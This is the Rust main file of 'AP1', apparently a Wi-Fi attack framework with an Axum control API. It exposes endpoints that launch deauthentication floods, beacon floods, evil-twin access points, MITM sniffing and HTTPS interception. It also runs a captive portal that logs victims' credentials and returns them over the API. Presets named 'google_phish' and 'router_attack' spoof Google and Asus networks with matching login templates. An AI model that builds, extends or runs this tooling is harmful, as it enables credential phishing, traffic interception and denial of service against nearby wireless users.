#![allow(dead_code)]

use axum::{
    extract::{Query, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::env;
use std::fs;
use std::net::SocketAddr;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex, OnceLock};
use tower_http::cors::CorsLayer;
use tracing::{info, warn, error};

mod ap_manager;
mod proxy;
mod system_control;
mod traffic_engine;
mod utils;
mod interfaces;
mod orchestrator;
mod event_bus;
mod hostapd;
mod dhcp;
mod dns;
mod captive_portal;
mod deauth;
mod beacon_flood;
mod http_proxy;
mod mitm;
mod recon;
mod plugin_system;
mod packet_capture;
mod webui;
mod state_machine;
mod networking;
mod improvements;
mod https_detection;
mod logging;
mod config;
mod database;
mod sniff;

use crate::config::{AppConfig, Profile};

static APP_CONFIG: OnceLock<Mutex<AppConfig>> = OnceLock::new();

fn get_app_config() -> &'static Mutex<AppConfig> {
    APP_CONFIG.get().expect("AppConfig not initialized")
}

#[derive(Clone, Debug, Deserialize, Serialize)]
struct PluginManifest {
    name: String,
    #[serde(rename = "type")]
    plugin_type: String,
    enabled: bool,
    description: String,
}

#[derive(Debug, Serialize)]
struct StatusResponse {
    service: String,
    version: String,
    config: AppConfig,
    plugins: Vec<PluginManifest>,
}

#[derive(Clone, Debug, Deserialize)]
struct PluginConfig {
    plugins: Vec<PluginManifest>,
}

// Shared state for Axum
struct AppState {
    config_path: PathBuf,
    plugin_config_path: PathBuf,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialize logging
    tracing_subscriber::fmt::init();

    let config_path = resolve_config_path().expect("Unable to resolve config path");
    let plugin_config_path = resolve_plugin_path().expect("Unable to resolve plugin config path");
    let config = load_config(&config_path).expect("Unable to load config");

    APP_CONFIG.set(Mutex::new(config.clone())).expect("Failed to set initial AppConfig");

    let listen_addr_str = extract_listen_addr(&config);
    let addr: SocketAddr = listen_addr_str.parse().expect("Invalid listen address");

    info!("Starting AP1 core engine on http://{}", addr);

    logging::init_logging();
    event_bus::subscribe("core.events");
    event_bus::emit(&"core started".to_string());
    webui::start_webui();

    let network_iface = if let Ok(env_iface) = std::env::var("AP1_IFACE") {
        if !env_iface.is_empty() { env_iface } else { "wlan0".to_string() }
    } else if !config.network.default_interface.is_empty() {
        config.network.default_interface.clone()
    } else {
        "wlan0".to_string()
    };

    info!("[*] Core using interface: {}", network_iface);

    if let Err(err) = packet_capture::start(&network_iface, "../system/runtime/packet_capture.log") {
        error!("packet capture start failed: {}", err);
    }
    mitm::sniff_traffic(&network_iface);

    let profile = get_active_profile(&config);

    if let Err(err) = plugin_system::load_plugins(&plugin_config_path) {
        warn!("plugin loader warning: {}", err);
    }
    plugin_system::trigger_hook("pre_ap_start", &plugin_config_path);

    let portal_cfg = portal_config_from_app(&config);
    if let Err(e) = orchestrator::start_ap_session(&network_iface, &profile, &portal_cfg, config.network.captive_portal) {
        error!("Failed to start AP session: {}", e);
    }

    http_proxy::start_proxy(8080);
    https_detection::start_https_interceptor(8443);
    proxy::init_proxy();
    orchestrator::start_module("core");

    // Start advanced sniffer
    sniff::start_sniffer(network_iface.clone());

    // Start Watchdog Thread (Step 2 Preview)
    start_watchdog();

    // Axum Router
    let app_state = Arc::new(AppState {
        config_path,
        plugin_config_path,
    });

    let app = Router::new()
        .route("/", get(root_handler))
        .route("/health", get(health_handler))
        .route("/api/heartbeat", get(heartbeat_handler))
        .route("/status", get(status_handler))
        .route("/config", get(config_handler))
        .route("/plugins", get(plugins_handler))
        .route("/api/system/firewall/apply", post(firewall_apply_handler))
        .route("/api/system/firewall/clear", post(firewall_clear_handler))
        .route("/api/system/interface/configure", post(interface_configure_handler))
        .route("/api/portal/start", post(portal_start_handler))
        .route("/api/portal/stop", post(portal_stop_handler))
        .route("/api/portal/status", get(portal_status_handler))
        .route("/api/portal/credentials", get(portal_credentials_handler))
        .route("/api/config/set_interface", post(set_interface_handler))
        .route("/api/config/set_template", post(set_template_handler))
        .route("/api/config/update", post(config_update_handler))
        .route("/api/config/reset", post(config_reset_handler))
        .route("/api/config/preset", post(config_preset_handler))
        .route("/api/recon/networks", get(recon_networks_handler))
        .route("/api/recon/congestion", get(recon_congestion_handler))
        .route("/api/traffic", get(traffic_handler))
        .route("/api/deauth/start", post(deauth_start_handler))
        .route("/api/eviltwin/start", post(eviltwin_start_handler))
        .route("/api/beacon/start", post(beacon_start_handler))
        .route("/api/beacon/stop", post(beacon_stop_handler))
        .route("/api/profiles/select", post(profile_select_handler))
        .layer(CorsLayer::permissive())
        .with_state(app_state);

    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}

// --- Handlers ---

async fn root_handler() -> &'static str {
    "AP1 core engine alive (Axum)"
}

async fn health_handler() -> Json<serde_json::Value> {
    Json(serde_json::json!({"status": "ok"}))
}

async fn heartbeat_handler() -> Json<serde_json::Value> {
    let config = get_app_config().lock().unwrap();
    Json(serde_json::json!({
        "status": "alive",
        "timestamp": chrono::Utc::now().to_rfc3339(),
        "active_profile": config.active_profile,
        "ap_running": is_process_running("hostapd"),
        "portal_running": captive_portal::is_running()
    }))
}

async fn status_handler(State(state): State<Arc<AppState>>) -> impl IntoResponse {
    let mut config = get_app_config().lock().unwrap().clone();
    if let Ok(iface) = std::env::var("AP1_IFACE") {
        config.network.default_interface = iface;
    }

    let plugins = load_plugin_config(&state.plugin_config_path).unwrap_or_default();
    let response = StatusResponse {
        service: "ap1_core".to_string(),
        version: env!("CARGO_PKG_VERSION").to_string(),
        config,
        plugins,
    };
    Json(response)
}

async fn config_handler() -> Json<AppConfig> {
    Json(get_app_config().lock().unwrap().clone())
}

async fn plugins_handler(State(state): State<Arc<AppState>>) -> impl IntoResponse {
    match load_plugin_config(&state.plugin_config_path) {
        Ok(list) => (StatusCode::OK, Json(list)).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

#[derive(Deserialize)]
struct FirewallRequest {
    interface: Option<String>,
    portal_ip: Option<String>,
}

async fn firewall_apply_handler(Json(payload): Json<FirewallRequest>) -> impl IntoResponse {
    let iface = payload.interface.unwrap_or_else(|| "wlan0".to_string());
    let portal = payload.portal_ip.unwrap_or_else(|| "192.168.50.1".to_string());
    match system_control::apply_firewall_rules(&iface, &portal) {
        Ok(_) => Json(serde_json::json!({"status": "firewall rules applied"})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

async fn firewall_clear_handler(Json(payload): Json<FirewallRequest>) -> impl IntoResponse {
    let iface = payload.interface.unwrap_or_else(|| "wlan0".to_string());
    let portal = payload.portal_ip.unwrap_or_else(|| "192.168.50.1".to_string());
    match system_control::clear_firewall_rules(&iface, &portal) {
        Ok(_) => Json(serde_json::json!({"status": "firewall rules cleared"})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

#[derive(Deserialize)]
struct InterfaceRequest {
    interface: Option<String>,
    ip: Option<String>,
    subnet: Option<String>,
}

async fn interface_configure_handler(Json(payload): Json<InterfaceRequest>) -> impl IntoResponse {
    let iface = payload.interface.unwrap_or_else(|| "wlan0".to_string());
    let ip = payload.ip.unwrap_or_else(|| "192.168.50.1".to_string());
    let subnet = payload.subnet.unwrap_or_else(|| "24".to_string());
    match system_control::configure_interface(&iface, &ip, &subnet) {
        Ok(_) => Json(serde_json::json!({"status": format!("interface {} configured", iface)})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

async fn portal_start_handler() -> Json<serde_json::Value> {
    let config = get_app_config().lock().unwrap().clone();
    let portal_cfg = portal_config_from_app(&config);
    captive_portal::start_portal_with_config(portal_cfg.clone());
    traffic_engine::start_traffic_engine(&portal_interface(&config), &portal_cfg.portal_ip);
    Json(serde_json::json!({"status": "portal started"}))
}

async fn portal_stop_handler() -> impl IntoResponse {
    let config = get_app_config().lock().unwrap().clone();
    let iface = portal_interface(&config);
    let portal_cfg = portal_config_from_app(&config);
    match orchestrator::stop_ap_session(&iface, &portal_cfg) {
        Ok(_) => Json(serde_json::json!({"status": "AP session stopped"})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

async fn portal_status_handler() -> Json<serde_json::Value> {
    let is_running = captive_portal::is_running();
    let credentials = captive_portal::read_credentials();

    let mut cred_objs = Vec::new();
    for line in credentials {
        let mut obj = serde_json::Map::new();
        for part in line.split_whitespace() {
            let kv: Vec<&str> = part.splitn(2, '=').collect();
            if kv.len() == 2 {
                obj.insert(kv[0].to_string(), serde_json::Value::String(kv[1].to_string()));
            }
        }
        cred_objs.push(serde_json::Value::Object(obj));
    }

    Json(serde_json::json!({
        "running": is_running,
        "credentials": cred_objs
    }))
}

async fn portal_credentials_handler() -> Json<Vec<serde_json::Value>> {
    Json(database::get_credentials())
}

async fn set_interface_handler(State(state): State<Arc<AppState>>, Json(payload): Json<InterfaceRequest>) -> impl IntoResponse {
    if let Some(iface) = payload.interface {
        std::env::set_var("AP1_IFACE", &iface);
        let mut config = get_app_config().lock().unwrap();
        config.network.default_interface = iface.clone();
        let _ = save_config(&state.config_path, &config);
        Json(serde_json::json!({"status": format!("interface set to {}", iface)})).into_response()
    } else {
        (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "interface is required"}))).into_response()
    }
}

#[derive(Deserialize)]
struct TemplateRequest {
    template: String,
}

async fn set_template_handler(State(state): State<Arc<AppState>>, Json(payload): Json<TemplateRequest>) -> impl IntoResponse {
    let mut config = get_app_config().lock().unwrap();
    config.network.template = payload.template.clone();
    let _ = save_config(&state.config_path, &config);

    let template_dir = if payload.template.is_empty() {
        "../config/templates".to_string()
    } else {
        format!("../config/templates/{}", payload.template)
    };

    captive_portal::update_template_dir(&template_dir);
    Json(serde_json::json!({"status": format!("template set to {}", payload.template)}))
}

async fn config_update_handler(State(state): State<Arc<AppState>>, Json(json_body): Json<serde_json::Value>) -> Json<serde_json::Value> {
    let mut config = get_app_config().lock().unwrap();
    let active_profile_name = config.active_profile.clone().unwrap_or_else(|| "default".to_string());

    if let Some(ssid) = json_body.get("ssid").and_then(|v| v.as_str()) {
        if let Some(profiles) = config.profiles.as_mut() {
            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                p.ssid = ssid.to_string();
            }
        }
    }
    if let Some(ch) = json_body.get("channel").and_then(|v| v.as_i64()) {
        if let Some(profiles) = config.profiles.as_mut() {
            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                p.channel = ch as i32;
            }
        }
    }
    if let Some(pass) = json_body.get("password").and_then(|v| v.as_str()) {
        if let Some(profiles) = config.profiles.as_mut() {
            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                p.password = pass.to_string();
            }
        }
    }
    if let Some(sec) = json_body.get("security").and_then(|v| v.as_str()) {
        if let Some(profiles) = config.profiles.as_mut() {
            if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                p.security = Some(sec.to_string());
            }
        }
    }

    let _ = save_config(&state.config_path, &config);
    Json(serde_json::json!({"status": "config updated"}))
}

async fn config_reset_handler(State(state): State<Arc<AppState>>) -> impl IntoResponse {
    let default_config = AppConfig {
        app: crate::config::AppInfo {
            name: "AP1".to_string(),
            environment: "development".to_string(),
            api_url: "http://127.0.0.1:8001".to_string(),
            core_url: "http://127.0.0.1:8081".to_string(),
        },
        network: crate::config::NetworkConfig {
            default_interface: "wlan0".to_string(),
            captive_portal: true,
            template: "DarkLogin".to_string(),
            portal_ip: "192.168.50.1".to_string(),
            portal_port: Some(80),
            portal_fallback_port: Some(8000),
            dns_ip: "192.168.50.1".to_string(),
            subnet: Some(24),
        },
        logging: crate::config::LoggingConfig {
            level: "info".to_string(),
        },
        active_profile: Some("default".to_string()),
        profiles: Some(vec![
            Profile {
                name: "default".to_string(),
                ssid: "FreeWifi".to_string(),
                password: "ap1password".to_string(),
                channel: 1,
                mode: "g".to_string(),
                dhcp_enabled: true,
                security: Some("open".to_string()),
            },
            Profile {
                name: "guest".to_string(),
                ssid: "AP1-Guest".to_string(),
                password: "guestpass".to_string(),
                channel: 11,
                mode: "n".to_string(),
                dhcp_enabled: true,
                security: Some("wpa2".to_string()),
            },
        ]),
    };

    let mut config = get_app_config().lock().unwrap();
    *config = default_config.clone();

    match save_config(&state.config_path, &config) {
        Ok(_) => Json(serde_json::json!({"status": "config reset to factory defaults"})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

async fn config_preset_handler(State(state): State<Arc<AppState>>, Json(json_body): Json<serde_json::Value>) -> impl IntoResponse {
    let mut config = get_app_config().lock().unwrap();
    let active_profile_name = config.active_profile.clone().unwrap_or_else(|| "default".to_string());

    if let Some(name) = json_body.get("name").and_then(|v| v.as_str()) {
        match name {
            "open_nav" => {
                config.network.captive_portal = false;
                if let Some(profiles) = config.profiles.as_mut() {
                    if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                        p.ssid = "Free_Internet".to_string();
                        p.security = Some("open".to_string());
                    }
                }
            },
            "google_phish" => {
                config.network.captive_portal = true;
                config.network.template = "Google".to_string();
                if let Some(profiles) = config.profiles.as_mut() {
                    if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                        p.ssid = "Google_Free_Wifi".to_string();
                        p.security = Some("open".to_string());
                    }
                }
            },
            "router_attack" => {
                config.network.captive_portal = true;
                config.network.template = "RouterLogin".to_string();
                if let Some(profiles) = config.profiles.as_mut() {
                    if let Some(p) = profiles.iter_mut().find(|p| p.name == active_profile_name) {
                        p.ssid = "Asus_Router_Update".to_string();
                        p.security = Some("open".to_string());
                    }
                }
            },
            _ => return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "unknown preset"}))).into_response(),
        }
        let _ = save_config(&state.config_path, &config);
        Json(serde_json::json!({"status": format!("preset {} applied", name)})).into_response()
    } else {
        (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "name is required"}))).into_response()
    }
}

async fn recon_networks_handler(Query(params): Query<HashMap<String, String>>) -> Json<Vec<recon::WiFiNetwork>> {
    let iface = params.get("iface").cloned().unwrap_or_else(|| "wlan0".to_string());
    let networks = recon::scan_targets(&iface);
    Json(networks)
}

async fn recon_congestion_handler() -> Json<serde_json::Value> {
    recon::analyze_congestion("wlan0");
    Json(serde_json::json!({"status": "analysis printed to core log"}))
}

async fn traffic_handler(Query(params): Query<HashMap<String, String>>) -> Json<Vec<serde_json::Value>> {
    let limit = params.get("limit").and_then(|l| l.parse::<i32>().ok()).unwrap_or(50);
    Json(database::get_traffic(limit))
}

#[derive(Deserialize)]
struct DeauthRequest {
    interface: String,
    bssid: String,
    client: Option<String>,
    count: Option<u32>,
}

async fn deauth_start_handler(Json(payload): Json<DeauthRequest>) -> impl IntoResponse {
    let count = payload.count.unwrap_or(10);
    let result = if let Some(client) = payload.client {
        deauth::deauth_client(&payload.interface, &payload.bssid, &client, count)
    } else {
        deauth::deauth_all(&payload.interface, &payload.bssid)
    };
    match result {
        Ok(out) => Json(serde_json::json!({"status": "deauth started", "output": out})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

#[derive(Deserialize)]
struct EvilTwinRequest {
    interface: String,
    ssid: String,
}

async fn eviltwin_start_handler(Json(payload): Json<EvilTwinRequest>) -> impl IntoResponse {
    let config = get_app_config().lock().unwrap().clone();
    let portal_cfg = portal_config_from_app(&config);
    match orchestrator::start_evil_twin(&payload.interface, &payload.ssid, &portal_cfg) {
        Ok(_) => Json(serde_json::json!({"status": format!("evil twin for {} started", payload.ssid)})).into_response(),
        Err(err) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response(),
    }
}

#[derive(Deserialize)]
struct BeaconRequest {
    interface: String,
    ssids: Vec<String>,
}

async fn beacon_start_handler(Json(payload): Json<BeaconRequest>) -> Json<serde_json::Value> {
    let flood = beacon_flood::BeaconFlood::new();
    flood.start(&payload.interface, payload.ssids);
    Json(serde_json::json!({"status": "beacon flood started"}))
}

async fn beacon_stop_handler() -> Json<serde_json::Value> {
    let _ = std::process::Command::new("pkill").arg("-f").arg("mdk4").output();
    Json(serde_json::json!({"status": "beacon flood stopped"}))
}

#[derive(Deserialize)]
struct ProfileSelectRequest {
    profile: String,
}

async fn profile_select_handler(State(state): State<Arc<AppState>>, Json(payload): Json<ProfileSelectRequest>) -> impl IntoResponse {
    if payload.profile.is_empty() {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "profile is required"}))).into_response();
    }
    let mut config = get_app_config().lock().unwrap().clone();
    let selected = config.profiles.as_ref().and_then(|list| list.iter().find(|p| p.name == payload.profile).cloned());

    if let Some(profile) = selected {
        config.active_profile = Some(payload.profile.clone());
        {
            let mut global_cfg = get_app_config().lock().unwrap();
            *global_cfg = config.clone();
        }
        if let Err(err) = save_config(&state.config_path, &config) {
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response();
        }
        let iface = portal_interface(&config);
        let portal_cfg = portal_config_from_app(&config);
        if let Err(err) = orchestrator::start_ap_session(&iface, &profile, &portal_cfg, config.network.captive_portal) {
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": err}))).into_response();
        }
        Json(serde_json::json!({"status": format!("profile {} activated", payload.profile)})).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "profile not found"}))).into_response()
    }
}

// --- Utils ---

fn resolve_config_path() -> Result<PathBuf, String> {
    if let Ok(env_path) = env::var("AP1_CONFIG_PATH") {
        let path = PathBuf::from(env_path);
        if path.exists() { return Ok(path); }
    }
    candidate_config_paths().into_iter().find(|p| p.exists()).ok_or_else(|| "Config not found".into())
}

fn resolve_plugin_path() -> Result<PathBuf, String> {
    if let Ok(env_path) = env::var("AP1_PLUGIN_CONFIG_PATH") {
        let path = PathBuf::from(env_path);
        if path.exists() { return Ok(path); }
    }
    candidate_plugin_paths().into_iter().find(|p| p.exists()).ok_or_else(|| "Plugin config not found".into())
}

fn candidate_config_paths() -> Vec<PathBuf> {
    vec![PathBuf::from("config/global.yaml"), PathBuf::from("../config/global.yaml")]
}

fn candidate_plugin_paths() -> Vec<PathBuf> {
    vec![PathBuf::from("config/plugins.yaml"), PathBuf::from("../config/plugins.yaml")]
}

fn load_config(path: &Path) -> Result<AppConfig, String> {
    let raw = fs::read_to_string(path).map_err(|e| e.to_string())?;
    serde_yaml::from_str(&raw).map_err(|e| e.to_string())
}

fn load_plugin_config(path: &Path) -> Result<Vec<PluginManifest>, String> {
    let raw = fs::read_to_string(path).map_err(|e| e.to_string())?;
    let config: PluginConfig = serde_yaml::from_str(&raw).map_err(|e| e.to_string())?;
    Ok(config.plugins)
}

fn save_config(path: &Path, cfg: &AppConfig) -> Result<(), String> {
    let raw = serde_yaml::to_string(cfg).map_err(|e| e.to_string())?;
    fs::write(path, raw).map_err(|e| e.to_string())
}

fn portal_interface(config: &AppConfig) -> String {
    if let Ok(iface) = std::env::var("AP1_IFACE") {
        if !iface.is_empty() { return iface; }
    }
    if config.network.default_interface.is_empty() { "wlan0".to_string() } else { config.network.default_interface.clone() }
}

fn portal_ip(config: &AppConfig) -> String {
    if config.network.portal_ip.is_empty() { "192.168.50.1".to_string() } else { config.network.portal_ip.clone() }
}

fn portal_config_from_app(config: &AppConfig) -> captive_portal::PortalConfig {
    captive_portal::PortalConfig {
        template_dir: if config.network.template.is_empty() {
            "../config/templates/DarkLogin".to_string()
        } else {
            format!("../config/templates/{}", config.network.template)
        },
        log_path: "../system/runtime/portal_credentials.log".to_string(),
        portal_ip: portal_ip(config),
        portal_port: config.network.portal_port.unwrap_or(80),
        fallback_port: config.network.portal_fallback_port.unwrap_or(8000),
    }
}

fn get_active_profile(config: &AppConfig) -> Profile {
    if let Some(active) = config.active_profile.as_ref() {
        if let Some(profiles) = config.profiles.as_ref() {
            if let Some(p) = profiles.iter().find(|p| &p.name == active) {
                return p.clone();
            }
        }
    }
    Profile {
        name: "default".to_string(),
        ssid: "AP1-Test".to_string(),
        password: "password123".to_string(),
        channel: 1,
        mode: "g".to_string(),
        dhcp_enabled: true,
        security: Some("wpa2".to_string()),
    }
}

fn extract_listen_addr(config: &AppConfig) -> String {
    if let Ok(addr) = env::var("AP1_CORE_ADDR") { return addr; }
    if !config.app.core_url.is_empty() {
        return config.app.core_url.trim_start_matches("http://").trim_start_matches("https://").to_string();
    }
    "127.0.0.1:8081".to_string()
}

// --- Watchdog (Step 2 Implementation) ---

fn start_watchdog() {
    std::thread::spawn(|| {
        loop {
            std::thread::sleep(std::time::Duration::from_secs(10));
            check_services();
        }
    });
}

fn check_services() {
    let services = ["hostapd", "dnsmasq"];
    for service in services {
        if !is_process_running(service) {
            warn!("Service {} is not running! Attempting to restart...", service);
            // In a real scenario, we would trigger a restart here via orchestrator
        }
    }
}

fn is_process_running(name: &str) -> bool {
    let output = std::process::Command::new("pgrep")
        .arg("-x")
        .arg(name)
        .output();

    match output {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}
